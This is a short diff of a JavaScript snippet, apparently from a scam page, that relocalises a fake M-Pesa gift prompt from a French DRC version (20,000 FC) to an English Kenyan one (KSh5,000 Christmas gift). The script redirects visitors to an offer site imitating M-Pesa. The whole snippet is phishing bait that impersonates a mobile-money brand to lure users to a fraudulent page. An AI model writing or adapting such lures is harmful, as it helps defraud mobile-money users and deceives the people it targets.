@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '20.000FC'
-password=prompt('SMS: Félicitations, votre compte Mpesa est éligible pour recevoir le cadeau danniversaire Mpesa de 20.000FC. Veuillez cliquer sur OK POUR CONTINUER ','20.000FC');
-if (password != '20.000FC') {
+var password = 'KSh5,000'
+password=prompt('SMS: Congratulations, your M-Pesa account is eligible to receive the M-Pesa Christmas gift of KSh5,000. Please click OK to Continue. ','KSh5,000');
+if (password != 'KSh5,000') {
 location.href='https://mpesa-drc.offer-it.live/gift';
 
 }
+
